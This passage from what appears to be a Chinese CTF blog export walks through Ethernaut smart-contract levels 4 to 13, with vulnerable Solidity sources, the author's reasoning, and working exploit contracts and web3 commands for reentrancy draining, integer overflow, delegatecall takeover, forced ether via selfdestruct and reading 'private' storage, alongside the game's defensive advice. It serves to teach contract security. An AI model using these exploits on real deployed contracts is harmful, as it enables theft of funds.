function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract exp&#123; Telephone tel; function setAttackAddr(address _addr)&#123; tel = Telephone(_addr); &#125; function attack(address _addr)&#123; tel.changeOwner(_addr); &#125;&#125; 2.获取合约地址和我们自己的用户地址，并查询合约拥有者 25 3.进行攻击 26 4.再次查询合约拥有者，发现变成了我们，攻击完毕 27 5.点击submit instance即可过关。 通关后的彩蛋 While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.An example of a possible attack is outlined below.1.Use tx.origin to determine whose tokens to transfer, e.g. 1234&gt; function transfer(address _to, uint _value) &#123;&gt; tokens[tx.origin] -= _value;&gt; tokens[_to] += _value;&gt; &#125; 2.Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g. 123&gt; function () payable &#123;&gt; token.transfer(attackerAddress, 10000);&gt; &#125; In this scenario, tx.origin will be the victim’s address (while msg.sender will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker. level 5- Token题目链接 胜利条件1.攻击Token代币合约2.开始时会获取20个代币，我们需要获得额外的、大量的代币 tips1.odometer 源码12345678910111213141516171819202122pragma solidity ^0.4.18;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; function Token(uint _initialSupply) public &#123; //初始化代币给owner balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; //将msg.sender的value个代币转给_to，并且msg.sender-value的值大于0 require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; //查询代币数量 return balances[_owner]; &#125;&#125; 解题思路1.从transfer函数可以看出是很明显的整数溢出漏洞，转给别的地址大于20个代币即可 具体步骤1.初始化信息 29 2.进行转账操作，随便填一个地址，然后查询我们和转账地址的代币数，发现已经溢出 30 3.点击submit instance即可过关。 通关后的彩蛋 Overflows are very common in solidity and must be checked for with control statements such as: 123&gt; if(a + c &gt; a) &#123;&gt; a = a + c;&gt; &#125; An easier alternative is to use OpenZeppelin’s SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this: 1&gt; a = a.add(c); If there is an overflow, the code will revert. level 6- Delegation题目链接 胜利条件1.获得合约的所有权 tips1.查看Solidity文档中关于delegatecall low level function的内容2.Fallback方法3.Method ids 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Delegate &#123; address public owner; function Delegate(address _owner) public &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; function Delegation(address _delegateAddress) public &#123; //初始化 delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; function() public &#123; //FallBack函数 if(delegate.delegatecall(msg.data)) &#123; //执行参数为data的delegatecall this; &#125; &#125;&#125; 预备知识1.delegatecall简单来说就是delegatecall执行别的合约的方法的时候的作用域是调用合约的环境。比如别的合约的方法修改了它的第一个参数b，调用合约通过delegatecall调用该方法时，会把调用合约的第一个参数给修改掉(并且哪怕名字不一样也可以)具体内容可以参考这篇文章，写的挺详细的链接 解题思路1.首先我们的目的是通过delegatecall来执行Delegate合约中的pwn方法，进而通过delegatecall的漏洞来改变Delegation合约的owner，也就是改成我们。2.为了执行delegatecall，我们需要执行fallback函数，传入的data参数应该为pwn()的函数id，即其函数签名的sha3的前4个bytes(也就是4*2+2(0x)=10位) 具体步骤1.初始化实例并查看合约的owner 32 2.构造exp并执行contract.sendTransaction({data:web3.sha3(&quot;pwn()&quot;).slice(0,10)}).完毕之后查看owner，发现已经变成我们 33 3.点击submit instance即可过关。 通关后的彩蛋 Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying “here, -other contract- or -other library-, do whatever you want with my state”. Delegates have complete access to your contract’s state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care. Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD. level 7- Force题目链接 胜利条件1.让合约的balance&gt;0 tips1.Fallback方法2.用其他合约去攻击这个合约3.用Remix或Truffle 源码1234567891011pragma solidity ^0.4.18;contract Force &#123;/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m)*/&#125; 预备知识1.selfdestruct函数(析构函数)selfdestruct(address)会将当前合约的余额发送至address。 2.没有fallback函数如何往合约里打钱？当合约没有实现payable fallback函数的时候，依然有两种方法给合约里打钱&nbsp;&nbsp;&nbsp;&nbsp;a.将合约作为挖矿地址挖矿&nbsp;&nbsp;&nbsp;&nbsp;b.调用其他合约的析构函数selfdestruct并将此合约的地址作为参数 解题思路1.我们自己编写一个合约并约束一个方法为payable，并通过该方法向此合约中打钱。2.调用此合约的selfdestruct函数，将目标合约地址作为参数传入。这样此合约的剩下的钱就会被转移过去。 具体步骤1.编写exp合约 12345678910contract exp&#123; address attackAddr; function init(address _addr) public payable&#123; attackAddr=_addr; &#125; function attack()&#123; selfdestruct(attackAddr); &#125;&#125; 2.先调用init函数设置攻击合约的地址，并附加上一定数额的ETH 34 3.再调用attack函数进行转钱 3.点击submit instance即可过关。 通关后的彩蛋 In solidity, for a contract to be able to receive ether, the fallback function must be marked ‘payable’.However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant this.balance == 0 for any contract logic. level 8- Vault题目链接 胜利条件1.获得password并调用unlock函数使得locked参数变为false 源码1234567891011121314151617pragma solidity ^0.4.18;contract Vault &#123; bool public locked; bytes32 private password; function Vault(bytes32 _password) public &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; 预备知识1.在区块链上所有的块以及信息都是公开的，所以即使合约中使用了private，该信息依然是公开的，可以随时被别人查看。 解题思路1.通过读取区块链上的块中的信息获取password2.用该password作为参数调用unlock函数进行解锁 具体步骤1.通过web3.eth.getStorageAt(contract.address,1,(e,v)=&gt;alert(web3.toAscii(v)))指令查看password 35 2.将password传入unlock函数 36 3.点击submit instance即可过关。 通关后的彩蛋 It’s important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter. level 9- King题目链接 胜利条件1.你可以通过打钱成为新的King，当然前提是你的前比上一个King的钱多2.当你点击Submit的时候合约会重新变为King，你要想办法去保持King位 源码123456789101112131415161718192021pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract King is Ownable &#123; address public king; uint public prize; function King() public payable &#123; king = msg.sender; prize = msg.value; &#125; function() external payable &#123; //打更多的钱或者合约owner都可以调用此方法变为king require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; &#125;&#125; 预备知识1.Solidity 中几种转币方式。 &lt;address&gt;.transfer()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会 throw; 回滚状态&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.send()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.call.value()()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;传递所有可用 Gas 供调用，不能有效防止重入（reentrancy） 解题思路1.由于最后合约owner会调用fallback函数成为新的king，所以我们需要阻止这个函数的运行，也就是阻止transfer2.我们可以自己写个合约并将fallback函数设为revert()，这样就没有人可以通过transfer()打钱给我们。当然我们甚至可以不写fallback函数也可以实现这个效果 具体步骤1.编写exp合约(试了好几种写法都不行，只有这种可以，奇怪了) 12345678pragma solidity ^0.4.18;contract exp &#123; function exp() public payable &#123; address attackAddr = 0x529c6e4d28d24af49eada89a2f7effa44c8f58c3; attackAddr.call.gas(1000000).value(msg.value)(); &#125;&#125; 2.部署合约，注意要传入比原先的1ETH多 37 3.查看king可以发现king已经变成了我们部署的合约的地址 38 4.点击submit instance即可过关。 通关后的彩蛋 Most of Ethernaut’s levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.In this case, see: King of the Ether and King of the Ether Postmortem level 10- Re-entrancy题目链接 胜利条件1.将合约中的所有钱卷走 tips1.不可信的合约可以执行人们不希望出现的代码2.Fallback方法3.Throw/revert bubbling4.用其他合约去攻击这个合约5.用Remix或Truffle 源码12345678910111213141516171819202122232425pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125; 解题思路这是一个比较著名的重入漏洞，漏洞点在withdraw，它会先判断账户是否有那么多余额在调用call进行转账，然后再将balances中的金额减少。但是我们前面说过call过去的地址如果是个合约地址，并且合约的fallback函数也调用了withdraw函数，那么这就会成为一个递归问题，一直到gas=0才会停止。div style=”width: 50%; margin: auto”&gt; 39 所以我们可以利用这个机制编写合约将钱全部提出。 具体步骤1.编写exp合约 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125;contract exp &#123; address instance_address = 0xdc8941b8396a3140b008d124fcd149acd2005eff; Reentrance target = Reentrance(instance_address); function exp() payable&#123;&#125; function donate() public payable &#123; target.donate.value(msg.value)(this); &#125; function attack() public &#123; //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125; function get_balance() public view returns(uint) &#123; return target.balanceOf(this); &#125; function my_eth_bal() public view returns(uint) &#123; return address(this).balance; &#125; function ins_eth_bal() public view returns(uint) &#123; return instance_address.balance; &#125; function () public payable &#123; //同理写两次 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125;&#125; 2.调用donate方法捐款2ETH 40 3.调用attack方法进行攻击，可以看见钱全部在我们这里并且整数溢出了 41 攻击后的结果 42 4.点击submit instance即可过关。 通关后的彩蛋 Use transfer to move funds out of your contract, since it throws and limits gas forwarded. Low level functions like call and send just return false but don’t interrupt the execution flow when the receiving contract fails.Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.Re-entrancy is a common attack. You should always be prepared for it! The DAO HackThe famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack. level 11- Elevator题目链接 胜利条件1.将top设为true tips1.有时solidity语言不能保持诺言.2.Elevator可以被Building利用. 源码123456789101112131415161718192021pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125; 预备知识1.view关键字可以大概查看这篇文章了解一下 解题思路1.第一个方法是在我们自己设置的合约里面设置一个变量为true，每次调用isLastFloor函数的时候将该变量取反并返回。这是可行的，因为： 当前 Solidity 编译器没有强制执行视图函数（view function）或常量函数（constant function）不能修改状态。而且也没有强制纯函数（pure function）不读取状态信息。所以声明一个 view 和 pure 函数，并不保证就不修改数据状态。 2.第二个方法是我们每次调用isLastFloor函数的时候通过判断gas的奇偶来返回true or flase,一定概率下是可以碰撞成功的 具体步骤1.编写exp合约a.第一种方法 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125;contract exp &#123; address instance_address = 0x71e4e8947b9755da6b649e6ce86394e6a4e796bf; Elevator e = Elevator(instance_address); bool public isLast = true; function isLastFloor(uint) public returns (bool) &#123; isLast = ! isLast; return isLast; &#125; function attack() public &#123; e.goTo(100); &#125;&#125; b.第二种方法 123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125;contract exp &#123; address instance_address = 0x71e4e8947b9755da6b649e6ce86394e6a4e796bf; Elevator e = Elevator(instance_address); function isLastFloor(uint) public returns (bool) &#123; return (gasleft())%2==0; #低版本可以使用msg.gas &#125; function attack() public &#123; e.goTo(100); &#125;&#125; 2.调用attack()方法3.点击submit instance即可过关。 通关后的彩蛋 Currently, the Solidity compiler does nothing to enforce that a view or constant function is not modifying state. The same applies to pure functions, which should not read state but they can. Make sure you read Solidity’s documentation and learn its caveats.An alternative way to solve this level is to build a view function which returns different results depends on input data but don’t modify state, e.g. gasleft(). level 12- Privacy题目链接 胜利条件1.调用unlock函数将locked设为false tips1.了解storage,parameter parsing和casting是如何工作的2.使用remix或使用自己搭载的web3提供程序 源码123456789101112131415161718192021222324252627282930pragma solidity ^0.4.18;contract Privacy &#123; bool public locked = true; uint256 public constant ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; function Privacy(bytes32[3] _data) public &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */&#125; 预备知识1.如何读取合约的storage web3.eth.getStorageAt(contract.address, 0, function(x, y) {alert(y)}); //其中0可以换成1，2，32.变量存储规则根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。constant常量是无需存储的 解题思路1.通过读取storage得到一系列数据并找出data[2]提交到unlock函数解锁 具体步骤1.读取合约的storage 123450x0000000000000000000000000000000000000000000000000000007b3ff0a010x79a1ed4c7ba7bbe11d264f4ee6c1d980fe0e5087e9baf770a19f7fe605dcd4340xbbd5d1cf216d04652f128560551961bdb24c58cd4a50182a6ff2c19b0e1e5e060xd83aa7d5f6da7a858cc7a3646ab832ab7a7429a433c98cca8bb859436d8ad5e20x0000000000000000000000000000000000000000000000000000000000000000 2.进行分析除了ID常量不用存储，其他的常量分别如下：a.bool public locked = true 占 1 字节 -&gt; 01b.uint8 private flattening = 10 占 1 字节 -&gt; 0ac.uint8 private denomination = 255 占 1 字节 -&gt; ffd.uint16 private awkwardness = uint16(now) 占 2 字节 -&gt; 07b3刚好也就对应storage中的第一行最后的07b3ff0a01,则data[2]就应该是第四行的数据,由于是byte16，则提交前16个字节就行，也就是d83aa7d5f6da7a858cc7a3646ab832ab 3.将data[2]提交到unlock函数里 await contract.unlock(web3.toAscii(‘d83aa7d5f6da7a858cc7a3646ab832ab’)) 4.点击submit instance即可过关。 通关后的彩蛋 level 13- Gatekeeper One题目链接 胜利条件1.通过gatekeeper并注册成为entrant tips1.前面的Telephone和Token关卡学到的东西很有用2.您可以在Solidity的文档中了解有关msg.gas特殊变量或其首选别名gasleft()的更多信息（请参阅这个和此处）。 源码12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(msg.gas % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; 解题思路1.对于gateOne,我们可以通过自己编写一个合约去调用gateOne从而绕过，此时tx.origin是我们的钱包地址，msg.sender是编写的合约地址2.对于gateTwo,我们需要通过debugger找出msg.gas是8191倍数的时候3.对于gateThree,我们]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F01%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Start这个博客主要用来记录一些有关ctf的知识因为自己太健忘了，不记录下会出事的而且搭个博客以后AWD就不用再坐着发呆了，起码有点东西可以看本博客主要分为web和crypto两个方向，也是我现在负责的两个方向希望自己多多加油吧！ 最后来个常规操作 1$ ehco "Hello world"]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
</search>
